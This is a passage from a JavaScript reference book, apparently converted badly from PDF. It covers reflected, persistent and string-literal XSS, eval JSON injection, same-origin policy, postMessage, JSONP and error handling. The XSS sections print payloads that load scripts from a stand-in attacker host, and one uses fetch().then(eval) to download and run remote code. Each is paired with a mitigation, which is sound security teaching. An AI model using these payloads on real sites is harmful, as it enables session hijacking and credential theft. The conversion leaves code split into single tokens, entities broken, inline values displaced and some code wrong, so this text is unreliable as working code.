<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
This is a collection of common JavaScript security issues, like XSS
and eval injection. This collection also contains how to mitigate
these security issues.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch95-1">Section 95.1: Reflected Cross-site scripting (XSS)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Let&apos;s say Joe owns a website that allows you to log on, view puppy
videos, and save them to your account.
https    :   // <i>example.com/search?q=brown+puppies*
Whenever a user searches on that website, they are redirected to .

If a user&apos;s search doesn&apos;t match anything, than they see a message
along the lines of:
Your search (**brown puppies**), didn&apos;t match anything. Try again.
On the backend, that message is displayed like this:
**if**
(
!
searchResults
)
{
webPage
+=
&quot;&lt;div&gt;Your search (&lt;b&gt;&quot;
&plus;
searchQuery
&plus;
&quot;&lt;/b&gt;), didn&apos;t match anything. Try again.&quot;
;
}
  **&lt;h1**      **&gt;**   headings**&lt;/h1**
However, when Alice searches for **&gt;**, she gets this back:

Your search (**headings**

) didn&apos;t match anything. Try again.

Raw HTML:

Your search (&lt;b&gt;&lt;h1&gt;headings&lt;/h1&gt;&lt;/b&gt;) didn&apos;t match anything.
Try again.
**&lt;script**         **&gt;**   alert(1)**&lt;/script**

Than Alice searches for **&gt;**, she sees:
Your search (), didn&apos;t match anything. Try again.
And:
![](./images/image046.png){width="4.585416666666666in"
height="1.4868055555555555in"}
**&lt;script** src = &quot;https://alice.evil/puppy_xss.js&gt;&lt;/script&gt;really
cute puppies
Than Alice searches for , and copies the link in her address bar, and
then emails Bob:
Bob,
When I search for [cute
puppies](https://example.com/search?q=%3Cscript+src+=+%22https://alice.evil/puppy_xss.js%3E%3C/script%3Ereally+cute+puppies),
nothing happens!
Than Alice successfully gets Bob to run her script while Bob is logged
on to his account.

**Mitigation:**
1.  Escape all angle brackets in searches before returning the search
    term when no results are found.

2.  Don&apos;t return the search term when no results are found.

3.  **Add a [Content Security
    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
    to load active content from other domains**

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch95-2">Section 95.2: Persistent Cross-site scripting (XSS)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Let&apos;s say that Bob owns a social website that allows users to
personalize their profiles.
Alice goes to Bob&apos;s website, creates an account, and goes to her
profile settings. She sets her profile description to I&apos;m actually
too lazy to write something here.
When her friends view her profile, this code gets run on the server:
**if**
(
viewedPerson.
profile
.
description
)
{
page
+=
&quot;&lt;div&gt;&quot;
&plus;
viewedPerson.
profile
.
description
&plus;
&quot;&lt;/div&gt;&quot;
;
}
**else**
{
page
+=
&quot;&lt;div&gt;This person doesn&apos;t have a profile description.&lt;/div&gt;&quot;
;
}
Resulting in this HTML:
**&lt;**
**div**
**&gt;**
I&apos;m actually too lazy to write something here.
**&lt;**
**/div**
**&gt;**
**&lt;b**   **&gt;**   I like HTML**&lt;/b>**
Than Alice sets her profile description to **&gt;**. When she visits her
profile, instead of seeing
&lt;b&gt;I like HTML&lt;/b&gt;
she sees
**I like HTML**
Then Alice sets her profile to
**&lt;**
**script**
src =
&quot;https://alice.evil/profile_xss.js&quot;
**&gt;**
**&lt;**
**/script**
**&gt;**
I
&apos;m actually too lazy to write something
here.
Whenever someone visits her profile, they get Alice&apos;s script run on
Bob&apos;s website while logged on as their account.
**Mitigation**
1.  Escape angle brackets in profile descriptions, etc.

2.  Store profile descriptions in a plain text file that is then fetched
    with a script that adds the description via
.innerText
3.  **Add a [Content Security
    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
    to load active content from other domains**
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch95-3">Section 95.3: Persistent Cross-site scripting from JavaScript string literals</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Let&apos;s say that Bob owns a site that lets you post public messages.
The messages are loaded by a script that looks like this:
addMessage
(
&quot;Message 1&quot;
)
;
addMessage
(
&quot;Message 2&quot;
)
;
addMessage
(
&quot;Message 3&quot;
)
;
addMessage
(
&quot;Message 4&quot;
)
;
addMessage
(
&quot;Message 5&quot;
)
;
addMessage
(
&quot;Message 6&quot;
)
;
The addMessage function adds a posted message to the DOM. However, in
an effort to avoid XSS, **any HTML in messages posted is escaped.**
The script is generated **on the server** like this:
**for**
(
**var**
i
=
0
;
i
&lt;
messages.
length
;
i
++
)
{
script
+=
&quot;addMessage(
**&bsol;&amp;quot;**
&quot;
&plus;
messages
&lbrack;
i
&rbrack;
&plus;
&quot;
**&bsol;&amp;quot;**
)
;&quot;
;
}
My mom said     :   &quot;Life is good. Pie makes it better. &quot;
So alice posts a message that says: . Than when she previews the
message, instead of seeing her message she sees an error in the
console:
Uncaught SyntaxError
:
missing
)
after argument list
Why? Because the generated script looks like this:
addMessage
(
&quot;My mom said: &quot;
Life is good.
Pie
makes it better.
&quot;&quot;
)
;
That&apos;s a syntax error. Than Alice posts:
I like pie
&quot;);fetch(&quot;https:// <i>alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);//*
Then the generated script looks like: addMessage(&quot;I like pie
&quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);// <i>&quot;);*
**https**    **:**   *// <i><i>alice.evil/js_xss.js*</b>
That adds the message I like pie, but it also <b>downloads and runs
whenever someone visits Bob&apos;s site.</b>
<b>Mitigation:</b>

1.  Pass the message posted into JSON.stringify()

2.  Instead of dynamically building a script, build a plain text file
    containing all the messages that is later fetched by the script

3.  <b>Add a [Content Security
    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
    to load active content from other domains</b>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch95-4">Section 95.4: Why scripts from other people can harm your website and its visitors</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
If you don&apos;t think that malicious scripts can harm your site, <b>you
are wrong</b>. Here is a list of what a malicious script could do:

1.  Remove itself from the DOM so that <b>it can&apos;t be traced</b>

2.  Steal users&apos; session cookies and <b>enable the script author to log
    in as and impersonate them</b>

3.  Show a fake &quot;Your session has expired. Please log in again.&quot;
    message that <b>sends the user&apos;s password to the script author</b>.

4.  Register a malicious service worker that runs a malicious script
    <b>on every page visit</b> to that website.

5.  Put up a fake paywall demanding that users <b>pay money</b> to access
    the site <b>that actually goes to the script author</b>.

Please, <b>don&apos;t think that XSS won&apos;t harm your website and its
visitors.</b>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch95-5">Section 95.5: Evaled JSON injection</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Let&apos;s say that whenever someone visits a profile page in Bob&apos;s
website, the following URL is fetched:
https
:
// <i>example.com/api/users/1234/profiledata.json*
With a response like this:
{
&quot;name&quot;
:
&quot;Bob&quot;
,
&quot;description&quot;
:
&quot;Likes pie & security holes.&quot;
}

Than that data is parsed & inserted:
>
<b>var</b> data = eval(&quot;(&quot; + resp + &quot;)&quot;);
document.getElementById(&quot;#name&quot;).innerText = data.name;
>
document.getElementById(&quot;#description&quot;).innerText =
data.description;
>
Seems good, right? <b>Wrong.</b>
Likes XSS.&quot;});alert(1);({&quot;name&quot;:&quot;Alice&quot;,&quot;description&quot;:&quot;Likes
XSS.
What if someone&apos;s description is ?

Seems weird, but if poorly done, the response will be:
{
&quot;name&quot;
:
&quot;Alice&quot;
,
&quot;description&quot;
:
&quot;Likes pie & security holes.&quot;
}
)
;
alert
(
1
)
;
(
{
&quot;name&quot;
:
&quot;Alice&quot;
,
&quot;description&quot;
:
&quot;Likes
XSS.&quot;
}
And this will be
eval
ed:
(
{
&quot;name&quot;
:
&quot;Alice&quot;
,
&quot;description&quot;
:
&quot;Likes pie & security holes.&quot;
}
)
;
alert
(
1
)
;
(
{
&quot;name&quot;
:
&quot;Alice&quot;
,
&quot;description&quot;
:
&quot;Likes
XSS.&quot;
}
)
If you don&apos;t think that&apos;s a problem, paste that in your console and
see what happens.

<b>Mitigation</b>

<b>Use JSON.parse instead of eval to get JSON.</b> In general, don&apos;t use
eval, and definitely don&apos;t use eval with something a user could
control. Eval [creates a new execution
context](http://dmitrysoshnikov.com/ecmascript/chapter-1-execution-contexts/),
creating a <b>performance hit</b>.
Properly escape
&quot;
and
&bsol;&bsol;
in user data before putting it in JSON. If you just escape the
&quot;
, than this will happen:
Hello
!
&bsol;&bsol;
&quot;});alert(1);({
Will be converted to:
&quot;Hello!
<b>&bsol;&bsol;&amp;ast;*
&quot;
}
)
;
alert
(
1
)
;
(
{
&quot;
Oops. Remember to escape both the &bsol;&bsol; and &quot;, or just use JSON.parse.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch96">Chapter 96: Same Origin Policy & CrossOrigin Communication</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Same-Origin policy is used by web browsers to prevent scripts to be
able to access remote content if the remote address has not the same
<b>origin</b> of the script. This prevents malicious scripts from
performing requests to other websites to obtain sensitive data.
The <b>origin</b> of two addresses is considered the same if both URLs
have the same *protocol*, *hostname* and *port*.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch96-1">Section 96.1: Safe cross-origin communication with messages</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
window.postMessage()   method together with its relative      window.onmessage
event handler                          
The can be safely used to enable cross-origin communication.
postMessage()
postMessage()
The method of the target window can be called to send a message to
another window, which will be able to intercept it with its onmessage
event handler, elaborate it, and, if necessary, send a response back
to the sender window using again.

<b>Example of Window communicating with a children frame</b>
Content of
http
:
// <i>main-site.com/index.html*
:
*&lt;!&bsol; &hellip; &amp;gt;*
<b>&lt;</b>
<b>iframe</b>
id
=
&quot;frame-id&quot;
src
=
&quot;http://other-site.com/index.html&quot;
<b>&gt;</b>
<b>&lt;</b>
<b>/iframe</b>
<b>&gt;</b>
<b>&lt;</b>
<b>script</b>
src
=
&quot;main_site_script.js&quot;
<b>&gt;</b>
<b>/script</b>
<b>&lt;</b>
<b>&gt;</b>
*&lt;!&bsol; &hellip; &amp;gt;*
Content of
http
:
// <i>other-site.com/index.html*
:
*&lt;!&bsol; &hellip; &amp;gt;*
<b>&lt;</b>
<b>script</b>
src
=
&quot;other_site_script.js&quot;
<b>&gt;</b>
<b>&lt;</b>
<b>/src</b>
<b>&gt;</b>
*&lt;!&bsol; &hellip; &amp;gt;*
Content of
main_site_script.
js
:
// <i>Get the &lt;iframe&gt;&apos;s window*
<b>var</b>
frameWindow
=
document.
getElementById
(
&apos;frame-id&apos;
)
.
contentWindow
;
// <i>Add a listener for a response*

window.
addEventListener
(
&apos;message&apos;
,
<b>function</b>
(
evt
)
{
// <i>IMPORTANT: Check the origin of the data!*
<b>if</b>
(
event.
origin
.
indexOf
(
&apos;http://other-site.com&apos;
)
==
0
)
{
// <i>Check the response*
console.
log
(
evt.
data
)
;
<i>/&ast; &hellip; &ast;/*
}
}
)
;
// <i>Send a message to the frame&apos;s window*
frameWindow.
postMessage
(
<i>/&ast; any obj or var &ast;/*
,
&apos;&ast;&apos;
)
;
Content of
other_site_script.
js
:
window.
addEventListener
(
&apos;message&apos;
,
<b>function</b>
(
evt
)
{
// <i>IMPORTANT: Check the origin of the data!*
<b>if</b>
(
event.
origin
.
indexOf
(
&apos;http://main-site.com&apos;
)
==
0
)
{
// <i>Read and elaborate the received data*
console.
log
(
evt.
data
)
;
<i>/&ast; &hellip; &ast;/*
// <i>Send a response back to the main window*
window.
parent
.
postMessage
(
<i>/&ast; any obj or var &ast;/*
,
&apos;&ast;&apos;
)
;
}
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch96-2">Section 96.2: Ways to circumvent Same-Origin Policy</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
As far as client-side JavaScript engines are concerned (those running
inside a browser), there is no straightforward solution available for
requesting content from sources other than the current domain. (By the
way, this limitation does not exist in JavaScript-server tools such as
Node JS.)
However, it is (in some situations) indeed possible to retrieve data
from other sources using the following methods. Please do note that
some of them may present hacks or workarounds instead of solutions
production system should rely on.
<b>Method 1: CORS</b>
Access
Most public APIs today allow developers to send data bidirectionally
between client and server by enabling a feature called CORS
(Cross-Origin Resource Sharing). The browser will check if a certain
HTTP header (-
Control                  &minus;   Allow             &minus;   Origin
) is set and that the requesting site&apos;s domain is listed in the
header&apos;s value. If it is, then the
browser will allow establishing AJAX connections.
However, because developers cannot change other servers&apos; response
headers, this method can&apos;t always be relied on.
<b>Method 2: JSONP</b>
<b>JSON</b> with <b>P</b>adding is commonly blamed to be a workaround. It is
not the most straightforward method, but it still gets the job done.
This method takes advantage of the fact that script files can be
loaded from any domain. Still, it is crucial to mention that
requesting JavaScript code from external sources is <b>always</b> a
potential security risk and this should generally be avoided if
there&apos;s a better solution available.
The data requested using JSONP is typically JSON, which happens to fit
the syntax used for object definition in JavaScript, making this
method of transport very simple. A common way to let websites use the
external data obtained via JSONP is to wrap it inside a callback
function, which is set via a GET parameter in the URL. Once the
external script file loads, the function will be called with the data
as its first parameter.
<b>&lt;</b>
<b>script</b>
<b>&gt;</b>
function myfunc(obj){
console.log(obj.example_field);
}
<b>&lt;</b>
<b>/script</b>
<b>&gt;</b>
<b>&lt;</b>
<b>script</b>
src
=
&quot;http://example.com/api/endpoint.js?callback=myfunc&quot;
<b>&gt;</b>
<b>&lt;</b>
<b>/script</b>
<b>&gt;</b>
http   :   // <i>example.com/api/endpoint.js?callback=myfunc*
The contents of might look like this:
myfunc
(
{
&quot;example_field&quot;
:
<b>true</b>
}
)
The function always has to be defined first, otherwise it won&apos;t be
defined when the external script loads.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch97">Chapter 97: Error Handling</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch97-1">Section 97.1: Error objects</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Runtime errors in JavaScript are instances of the Error object. The
Error object can also be used as-is, or as the base for user-defined
exceptions. It&apos;s possible to throw any type of value - for example,
strings - but you&apos;re strongly encouraged to use Error or one of its
derivatives to ensure that debugging information &bsol; such as stack
traces &bsol; is correctly preserved.
>
The first parameter to the Error constructor is the human-readable
error message. You should try to always specify a useful error message
of what went wrong, even if additional information can be found
elsewhere.
<b>try</b>
{
<b>throw</b>
<b>new</b>
Error
(
&apos;Useful message&apos;
)
;
}
<b>catch</b>
(
error
)
{
console.
log
(
&apos;Something went wrong! &apos;
&plus;
error.
message
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch97-2">Section 97.2: Interaction with Promises</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<h5>Version ≥ 6</h5>
Exceptions are to synchronous code what rejections are to
promise-based asynchronous code. If an exception is thrown in a
promise handler, its error will be automatically caught and used to
reject the promise instead.
Promise.
resolve
(
5
)
.
then
(
result
=&gt;
{
<b>throw</b>
<b>new</b>
Error
(
&quot;I don&apos;t like five&quot;
)
;
}
)
.
then
(
result
=&gt;
{
console.
info
(
&quot;Promise resolved: &quot;
&plus;
result
)
;
}
)
.
<b>catch</b>
(
error
=&gt;
{
console.
error
(
&quot;Promise rejected: &quot;
&plus;
error
)
;
}
)
;
Promise rejected
:
Error
:
I don
&apos;t like five
Version &bsol;7
The [async functions
proposal](http://tc39.github.io/ecmascript-asyncawait/)expected to
be part of ECMAScript 2017extends this in the opposite direction.
If you await a rejected promise, its error is raised as an exception:
async
<b>function</b>
main
(
)
{
<b>try</b>
{
await Promise.
reject
(
<b>new</b>
Error
(
&quot;Invalid something&quot;
)
)
;
}
<b>catch</b>
(
error
)
{
console.
log
(
&quot;Caught error: &quot;
&plus;
error
)
;
}
}
main
(
)
;
Caught error
:
Invalid something
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch97-3">Section 97.3: Error types</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
There are six specific core error constructors in JavaScript:
eval
<b>EvalError</b> - creates an instance representing an error that occurs
regarding the global function ().
<b>InternalError</b> - creates an instance representing an error that
occurs when an internal error in the
JavaScript engine is thrown. E.g. &quot;too much recursion&quot;. (Supported
only by <b>Mozilla Firefox</b>)
<b>RangeError</b> - creates an instance representing an error that occurs
when a numeric variable or parameter is outside of its valid range.
<b>ReferenceError</b> - creates an instance representing an error that
occurs when dereferencing an invalid reference.
eval
<b>SyntaxError</b> - creates an instance representing a syntax error that
occurs while parsing code in ().
<b>TypeError</b> - creates an instance representing an error that occurs
when a variable or parameter is not of a valid type.
encodeURI                   () or           decodeURI
<b>URIError</b> - creates an instance representing an error that occurs
when () are passed invalid parameters.
If you are implementing error handling mechanism you can check which
kind of error you are catching from code.
<b>try</b>
{
<b>throw</b>
<b>new</b>
TypeError
(
)
;
}
<b>catch</b>
(
e
)
{
<b>if</b>
(
e
<b>instanceof</b>
Error
)
{
console.
log
(
&apos;instance of general Error constructor&apos;
)
;
}
<b>if</b>
(
e
<b>instanceof</b>
TypeError
)
{
console.
log
(
&apos;type error&apos;
)
;
}
}
In such case e will be an instance of TypeError. All error types
extend the base constructor Error, therefore it&apos;s also an instance of
Error.
>
Keeping that in mind shows us that checking e to be an instance of
Error is useless in most cases.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch97-4">Section 97.4: Order of operations plus advanced thoughts</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Without a try catch block, undefined functions will throw errors and
stop execution:
undefinedFunction(&quot;This will not get executed&quot;);
console.log(&quot;I will never run because of the uncaught error!&quot;); Will
throw an error and not run the second line:
// <i>Uncaught ReferenceError: undefinedFunction is not defined*
You need a try catch block, similar to other languages, to ensure you
catch that error so code can continue to execute:
<b>try</b>
{
undefinedFunction
(
&quot;This will not get executed&quot;
)
;
}
<b>catch</b>
(
error
)
{
console.
log
(
&quot;An error occurred!&quot;
,
error
)
;
}
<b>finally</b>
{
console.
log
(
&quot;The code-block has finished&quot;
)
;
}
console.
log
(
&quot;I will run because we caught the error!&quot;
)
;
Now, we&apos;ve caught the error and can be sure that our code is going to
execute
// <i>An error occurred! ReferenceError: undefinedFunction is not
defined(*
...
*)*
// <i>The code-block has finished*
// <i>I will run because we caught the error!*
What if an error occurs in our catch block!?
<b>try</b>
{
undefinedFunction
(
&quot;This will not get executed&quot;
)
;
}
<b>catch</b>
(
error
)
{
otherUndefinedFunction
(
&quot;Uh oh&hellip; &quot;
)
;
console.
log
(
&quot;An error occurred!&quot;
,
error
)
;
}
<b>finally</b>
{
console.
log
(
&quot;The code-block has finished&quot;
)
;
}
console.
log
(
&quot;I won&apos;t run because of the uncaught error in the catch block!&quot;
)
;
We won&apos;t process the rest of our catch block, and execution will halt
except for the finally block.
// <i>The code-block has finished*
// <i>Uncaught ReferenceError: otherUndefinedFunction is not defined(*
...
*)*
You could always nest your try catch blocks.. but you shouldn&apos;t
because that will get extremely messy..
<b>try</b>
{
undefinedFunction
(
&quot;This will not get executed&quot;
)
;
}
<b>catch</b>
(
error
)
{
<b>try</b>
{
otherUndefinedFunction
(
&quot;Uh oh&hellip; &quot;
)
;
}
<b>catch</b>
(
error2
)
{
console.
log
(
&quot;Too much nesting is bad for my heart and soul&hellip;&quot;
)
;
}
console.
log
(
&quot;An error occurred!&quot;
,
error
)
;
}
<b>finally</b>
{
console.
log
(
&quot;The code-block has finished&quot;
)
;
}
console.
log
(
&quot;I will run because we caught the error!&quot;
)
;
Will catch all errors from the previous example and log the following:
// <i>Too much nesting is bad for my heart and soul&hellip;*
// <i>An error occurred! ReferenceError: undefinedFunction is not defined(*
...
*)*
// <i>The code-block has finished*
// <i>I will run because we caught the error!*
So, how can we catch all errors!? For undefined variables and
functions: you can&apos;t.
Also, you shouldn&apos;t wrap every variable and function in a try/catch
block, because these are simple examples that will only ever occur
once until you fix them. However, for objects, functions and other
variables that you know exist, but you don&apos;t know whether their
properties or sub-processes or side-effects will exist, or you expect
some error states in some circumstances, you should abstract your
error handling in some sort of manner. Here is a very basic example
and implementation.
Without a protected way to call untrusted or exception throwing
methods:
<b>function</b>
foo
(
a
,
b
,
c
)
{
console.
log
(
a
,
b
,
c
)
;
<b>throw</b>
<b>new</b>
Error
(
&quot;custom error!&quot;
)
;
}
<b>try</b>
{
foo
(
1
,
2
,
3
)
;
}
<b>catch</b>
(
e
)
{
<b>try</b>
{
foo
(
4
,
5
,
6
)
;
}
<b>catch</b>
(
e2
)
{
console.
log
(
&quot;We had to nest because there&apos;s currently no other way&hellip;&quot;
)
;
}
console.
log
(
e
)
;
}
// <i>1 2 3*
// <i>4 5 6*
// <i>We had to nest because there&apos;s currently no other way&hellip;*
// <i>Error: custom error!(*
...
*)*
And with protection:
<b>function</b>
foo
(
a
,
b
,
c
)
{
console.
log
(
a
,
b
,
c
)
;
<b>throw</b>
<b>new</b>
Error
(
&quot;custom error!&quot;
)
;
}
<b>function</b>
protectedFunction
(
fn
,
&hellip;
args
)
{
<b>try</b>
{
fn.
apply
(
<b>this</b>
,
args
)
;
}
<b>catch</b>
(
e
)
{
console.
log
(
&quot;caught error: &quot;
&plus;
e&period;
name
&plus;
&quot; -&amp;quot;
&plus;
e&period;
message
)
;
}
}
protectedFunction
(
foo
,
1
,
2
,
3
)
;
protectedFunction
(
foo
,
4
,
5
,
6
)
;
// <i>1 2 3*
// <i>caught error: Error -&bsol;custom error!*
// <i>4 5 6*
// <i>caught error: Error -&bsol;custom error!*
We catch errors and still process all the expected code, though with a
somewhat different syntax. Either way will work, but as you build more
advanced applications you will want to start thinking about ways to
abstract your error handling.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch98">Chapter 98: Global error handling in browsers</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>Parameter Details</b>
Some browsers will call the event handler with just one argument, an
Event object. However,
eventOrMessage other browsers, especially the older ones and older
mobile ones will supply a String message as a first argument.
If a handler is called with more than 1 argument, the second argument
usually is an URL of a url
JavaScript file that is the source of the problem.
If a handler is called with more than 1 argument, the third argument
is a line number inside the lineNumber
JavaScript source file.
If a handler is called with more than 1 argument, the fourth argument
is the column number colNumber inside the JavaScript source file.
If a handler is called with more than 1 argument, the fifth argument
is sometimes an Error object error describing the problem.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch98-1">Section 98.1: Handling window.onerror to report all errors back to the server-side</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
window.onerror
The following example listens to event and uses an image beacon
technique to send the information through the GET parameters of an
URL.
<b>var</b> hasLoggedOnce = <b>false</b>;
// <i>Some browsers (at least Firefox) don&apos;t report line and column
numbers*
// <i>when event is handled through window.addEventListener(&apos;error&apos;,
fn). That&apos;s why // a more reliable approach is to set an event
listener via direct assignment.* window.onerror = <b>function</b>
(eventOrMessage, url, lineNumber, colNumber, error) { <b>if</b>
(hasLoggedOnce &vert;&vert; !eventOrMessage) {
// <i>It does not make sense to report an error if:*
// <i>1. another one has already been reported &bsol; the page has an
invalid state and may produce way too many errors.*
// <i>2. the provided information does not make sense (!eventOrMessage
&bsol; the browser didn&apos;t supply information for some reason.)*
<b>return</b>; } hasLoggedOnce = <b>true</b>; <b>if</b> (<b>typeof</b>
eventOrMessage !== &apos;string&apos;) { error = eventOrMessage.error; url =
eventOrMessage.filename &vert;&vert; eventOrMessage.fileName; lineNumber =
eventOrMessage.lineno &vert;&vert; eventOrMessage.lineNumber; colNumber =
eventOrMessage.colno &vert;&vert; eventOrMessage.columnNumber; eventOrMessage
= eventOrMessage.message &vert;&vert; eventOrMessage.name &vert;&vert; error.message
&vert;&vert; error.name; } <b>if</b> (error && error.stack) { eventOrMessage =
&lbrack;eventOrMessage, &apos;; Stack: &apos;, error.stack, &apos;.&apos;&rbrack;.join(&apos;&apos;); }
<b>var</b> jsFile = (/&lbrack;&Hat;*/&rbrack;+&amp;period;js/i*.exec(url &vert;&vert; &apos;&apos;) &vert;&vert;
&lbrack;&rbrack;)&lbrack;0&rbrack; &vert;&vert; &apos;inlineScriptOrDynamicEvalCode&apos;, stack =
&lbrack;eventOrMessage, &apos; Occurred in &apos;, jsFile, &apos;:&apos;, lineNumber &vert;&vert;
&apos;?&apos;, &apos;:&apos;, colNumber &vert;&vert; &apos;?&apos;&rbrack;.join(&apos;&apos;);
// <i>shortening the message a bit so that it is more likely to fit into
browser&apos;s URL length limit*
*(which is 2,083 in some browsers)* stack =
stack.replace(/https?&bsol;&bsol;:&bsol;&bsol;/&bsol;&bsol;/&lbrack;&Hat;*/&rbrack;+/gi*, &apos;&apos;);
// <i>calling the server-side handler which should probably register the
error in a database or a log file*
<b>new</b>
Image
(
)
.
src
=
&apos;/exampleErrorReporting?stack=&apos;
&plus;
encodeURIComponent
(
stack
)
;
// <i>window.DEBUG_ENVIRONMENT a configurable property that may be set to
true somewhere else for*
*debugging and testing purposes.*
<b>if</b>
(
window.
DEBUG_ENVIRONMENT
)
{
alert
(
&apos;Client-side script failed: &apos;
&plus;
stack
)
;
}
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch99">Chapter 99: Debugging</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-1">Section 99.1: Interactive interpreter variables</h3>
